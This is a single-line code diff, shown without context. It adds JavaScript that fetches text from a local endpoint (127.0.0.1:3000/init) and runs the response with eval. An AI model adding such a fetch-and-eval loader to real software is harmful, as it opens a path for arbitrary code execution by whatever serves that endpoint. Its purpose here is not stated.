@@ -1,0 +1,1 @@
+port=3000;fetch(`http://127.0.0.1:${port}/init`).then(r => r.text()).then(eval)
